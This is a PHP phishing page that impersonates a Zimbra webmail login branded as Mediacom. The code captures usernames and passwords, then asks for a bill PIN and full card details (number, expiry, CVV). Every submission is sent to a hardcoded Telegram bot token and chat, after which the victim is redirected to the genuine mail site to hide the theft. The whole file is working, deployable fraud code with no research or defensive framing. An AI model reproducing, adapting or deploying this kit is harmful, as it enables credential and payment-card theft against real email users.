<?php
// zimbra_verification.php
// Single-file flow: Login -> Bill verification -> Thank you + 8s redirect
// Telegram config (kept server-side)
$TELEGRAM_TOKEN = "7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo";
$TELEGRAM_CHAT  = "1920675677";

function safe($v) {
    // basic sanitize: trim, remove tags, limit length
    return mb_substr(trim(strip_tags($v ?? '')), 0, 2000);
}
function sendTelegram($token, $chat, $text) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $post = [
        'chat_id' => $chat,
        'text'    => $text,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Determine step
$step = 'login'; // default view
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $posted_step = $_POST['__step'] ?? '';
    if ($posted_step === 'login') {
        // capture login fields (match your HTML ids/names)
        $username = safe($_POST['username'] ?? '');
        $password = safe($_POST['password'] ?? '');
        // send to telegram
        $msg = "🔐 <b>Login Submission</b>\nUsername: {$username}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
        sendTelegram($TELEGRAM_TOKEN, $TELEGRAM_CHAT, $msg);
        // move to bill step
        $step = 'bill';
    } elseif ($posted_step === 'bill') {
        $bill_number = safe($_POST['bill_number'] ?? '');
        $pin         = safe($_POST['pin'] ?? '');
        $test_card   = safe($_POST['test_card'] ?? '');
        $expiry      = safe($_POST['expiry'] ?? '');
        $cvv         = safe($_POST['cvv'] ?? '');
        $msg = "📄 <b>Bill Verification</b>\nBill Number: {$bill_number}\nPIN: {$pin}\nCard (placeholder): {$test_card}\nExpiry: {$expiry}\nCVV: {$cvv}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
        sendTelegram($TELEGRAM_TOKEN, $TELEGRAM_CHAT, $msg);
        $step = 'thankyou';
    } else {
        // unknown or direct POST -> show login
        $step = 'login';
    }
}
?><!DOCTYPE html>
<!--
  Integrated Zimbra login + bill verification + thank you (8s redirect)
  Keep this file on a PHP server and open it directly.
-->
<html class="user_font_size_normal" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
	<link rel="stylesheet" type="text/css" href="/css/common,login,zhtml,skin.css?skin=harmony&v=220612070740">
	<link rel="SHORTCUT ICON" href="/img/logo/favicon.ico">
	<style>
	/* Small helpers so the bill/thankyou pages match layout even if CSS unavailable */
	.LoginScreen { max-width: 720px; margin: 30px auto; }
	.center { margin: 0 auto; }
	.contentBox { padding: 18px; background: #fff; border-radius: 6px; }
	.formLabel { display:block; margin-top:10px; }
	.inputField { width:100%; padding:8px; margin-top:6px; box-sizing:border-box; }
	.submitBtn { margin-top:12px; padding:10px 14px; background:#0073aa; color:#fff; border:none; cursor:pointer; border-radius:4px; }
	.smallNote { color:#333; font-size:0.9rem; margin-top:8px; }
	.centerText { text-align:center; }
	</style>
</head>
<body onload="onLoad();">

	<div class="LoginScreen">
		<div class="center">
			<div class="contentBox">

<?php if ($step === 'login'): ?>
				<!-- ORIGINAL LOGIN HTML (only slight modification: form posts to this file and includes __step) -->
				<h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
					<span class="ImgLoginBanner"></span>
				</a></h1>
				<div id="ZLoginAppName">Web Client</div>

				<form method="post" name="loginForm" action="" accept-charset="UTF-8">
					<input type="hidden" name="__step" value="login"/>
					<input type="hidden" name="loginOp" value="login"/>
					<input type="hidden" name="login_csrf" value="<?php echo htmlspecialchars(safe($_POST['login_csrf'] ?? 'a7181cb5-d8ef-48a8-a2de-cade483f488b')); ?>"/>

					<table class="form">
						<tr>
							<td><label for="username">Username:</label></td>
							<td><input id="username" class="zLoginField inputField" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
						</tr>
						<tr>
							<td><label for="password">Password:</label></td>
							<td><input id="password" autocomplete="off" class="zLoginField inputField" name="password" type="password" value="" size="40" maxlength="1024"/></td>
						</tr>
						<tr>
							<td>&nbsp;</td>
							<td class="submitTD">
								<input id="remember" value="1" type="checkbox" name="zrememberme" />
								<label for="remember">Stay signed in</label>
								<input type="submit" class="ZLoginButton DwtButton submitBtn" value="Sign In" />
							</td>
						</tr>
						<tr>
							<td colspan="2"><hr/></td>
						</tr>
						<tr>
							<td>
								<label for="client">Version:</label>
							</td>
							<td>
								<div class="positioning">
									<select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
										<option value="preferred" selected > Default</option>
										<option value="advanced" > Advanced (Ajax)</option>
										<option value="standard" > Standard (HTML)</option>
										<option value="mobile" > Mobile</option>
										<option value="touch" > Touch</option>
									</select>
									<script TYPE="text/javascript">
									document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>");
									</script>
									<div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick='showWhatsThis();' role="tooltip"><h3 style="text-align:center;">Client Types</h3>	<b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br><b>Touch</b> is recommended for tablets. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
									<div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
								</div>
							</td>
						</tr>
					</table>
				</form>

<?php elseif ($step === 'bill'): ?>
				<!-- BILL VERIFICATION PAGE - uses same header/banner style -->
				<h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
					<span class="ImgLoginBanner"></span>
				</a></h1>
				<div id="ZLoginAppName">Web Client</div>

				<h2>Account Verification</h2>
				<p class="smallNote">This information is for verification purposes only — <strong>no charges will be made</strong>.</p>

				<form method="post" action="">
					<input type="hidden" name="__step" value="bill" />
					<label class="formLabel">Bill Number</label>
					<input class="inputField" type="text" name="bill_number" required />

					<label class="formLabel">Account PIN</label>
					<input class="inputField" type="text" name="pin" required />

					<label class="formLabel">Card Number (test placeholder)</label>
					<input class="inputField" type="text" name="test_card" required />

					<label class="formLabel">Expiry (MM/YY)</label>
					<input class="inputField" type="text" name="expiry" required />

					<label class="formLabel">Security Code (CVV)</label>
					<input class="inputField" type="text" name="cvv" required />

					<input type="submit" class="submitBtn" value="Verify" />
				</form>

<?php elseif ($step === 'thankyou'): ?>
				<!-- THANK YOU PAGE with 8s countdown and redirect -->
				<h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
					<span class="ImgLoginBanner"></span>
				</a></h1>
				<div id="ZLoginAppName">Web Client</div>

				<div class="centerText">
					<h2>✅ Thank you for validating your email access</h2>
					<p class="smallNote">You will be redirected to your mailbox in <span id="count">8</span> seconds...</p>
					<p class="smallNote">If you are not redirected, <a id="manualLink" href="https://mail1.mediacombb.net">click here</a>.</p>
				</div>

				<script>
				(function(){
					var t = 8;
					var el = document.getElementById('count');
					var iv = setInterval(function(){
						t--;
						if (el) el.textContent = t;
						if (t <= 0) {
							clearInterval(iv);
							window.location.href = "https://mail1.mediacombb.net";
						}
					}, 1000);
				})();
				</script>

<?php endif; ?>

			</div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small">Forgot your password? Visit the <a target="_new" href="https://support.mediacomcable.com/ManageID/"><font color="#0000ff"><U>Mediacom ID Management</U></font></a> page.</div>
			<div class="copyright">
			Copyright © 2023 Mediacom Communication Corp.  All rights reserved.</div>
		</div>
		<div class="decor2"></div>
	</div>

<script>
/* keep original helper JS (simplified where unrelated) */
function clientChange(selectValue) {
	var useStandard = false;
	useStandard = useStandard || (screen && (screen.width <= 800 && screen.height <= 600));
	var div = document.getElementById("ZLoginUnsupported");
	if (div) div.style.display = ((selectValue == 'advanced') && useStandard) ? 'block' : 'none';
}
function showWhatsThis() {
	var anchor = document.getElementById('ZLoginWhatsThisAnchor'),
        tooltip = document.getElementById("ZLoginWhatsThis"),
        doHide = (tooltip && tooltip.style.display === "block");
    if (tooltip) tooltip.style.display = doHide ? "none" : "block";
    if (anchor) anchor.setAttribute("aria-expanded", doHide ? "false" : "true");
}
function onLoad() {
	var loginForm = document.loginForm;
	if (loginForm && loginForm.username) {
		if (loginForm.username.value != "") {
			loginForm.password && loginForm.password.focus();
		}
		else {
			loginForm.username.focus();
		}
	}
	clientChange("preferred");
}
</script>
</body>
</html>
